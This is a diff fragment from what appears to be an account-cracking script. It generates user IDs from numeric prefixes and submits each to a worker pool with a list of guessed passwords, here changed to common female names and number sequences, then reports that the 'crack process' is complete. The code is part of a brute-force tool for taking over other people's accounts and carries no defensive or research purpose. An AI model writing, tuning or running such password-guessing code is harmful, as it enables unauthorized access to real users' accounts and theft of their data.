@@ -154,7 +154,7 @@ def fuck():
         print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         for love in user:
             uid = code+name+cod+love
-            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'i love you','iloveyou','free fire','freefire','Free Fire','FreeFire','102030','203040','304050','405060','506070','607080','708090']
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'i love you','iloveyou','102030','203040','304050','405060','506070','607080','708090','jannat','Jannat','nusrat','Nusrat','sadiya','Sadiya','sumaiya','Sumaiya','fariya','Fariya','jannatul','Jannatul','Mimmim','mimmim']
             yaari.submit(DEVHIS2,uid,pwx,tl)
     print('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     print(' ┏━[•] Crack process has been completed')
